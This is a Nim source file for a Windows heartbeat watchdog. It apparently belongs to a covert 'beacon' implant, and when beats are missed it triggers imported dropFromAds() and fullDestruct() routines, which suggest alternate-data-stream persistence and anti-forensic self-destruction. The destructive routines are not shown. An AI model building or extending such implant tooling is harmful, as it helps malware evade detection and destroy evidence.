# watchdog.nim — heartbeat monitor
#
# Background loop checks a shared atomic every N seconds.
# If beacon misses too many beats, call fullDestruct().

import std/atomics
import winim
import resurrect, selfdestruct

var heartbeat: Atomic[uint32]

proc kick*() =
  discard heartbeat.fetchAdd(1, moRelaxed)

var
  wdIntervalMs: uint32
  wdMaxMisses:  uint32

proc watchdogThreadProc(param: pointer): DWORD {.stdcall.} =
  var last   = heartbeat.load(moRelaxed)
  var misses = 0'u32
  while true:
    Sleep(DWORD(wdIntervalMs))
    let now = heartbeat.load(moRelaxed)
    if now == last:
      inc misses
      if misses >= wdMaxMisses:
        dropFromAds()
        fullDestruct()
    else:
      misses = 0
    last = now

proc start*(intervalMs, maxMisses: uint32) =
  wdIntervalMs = intervalMs
  wdMaxMisses  = maxMisses
  discard CreateThread(nil, 0,
    cast[LPTHREAD_START_ROUTINE](watchdogThreadProc),
    nil, 0, nil)
